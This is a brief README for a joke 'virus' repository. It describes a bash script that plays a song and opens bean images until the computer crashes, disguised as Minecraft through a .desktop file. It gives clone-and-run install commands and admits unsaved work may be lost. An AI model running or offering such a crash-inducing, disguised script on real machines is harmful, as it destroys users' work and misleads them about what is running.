# What is this?
This i a bash script that will play the song Bean Song by Josh Groban and open pictures of beans untill your computer crashes. It also disguises itself as minecraft by creating a .desktop file :3

# How do I install this?
```shell
git clone https://github.com/hacktail/Beans-virus-thing.git
cd Beans-virus-thing
chmod +rwx ./INSTALLBEANS.sh
./INSTALLBEANS.sh
```
# How do I uninstall this?
```shell
cd Beans-virus-thing
chmod +rwx ./REMOVEBEANS.sh #Only if you haven't run the installer
./REMOVEBEANS.sh
```

# Does this cause any harm?
Unless you've forgotten to save some work, no.


# How do I stop this from executing?
I don't know ¯\_(ツ)_/¯
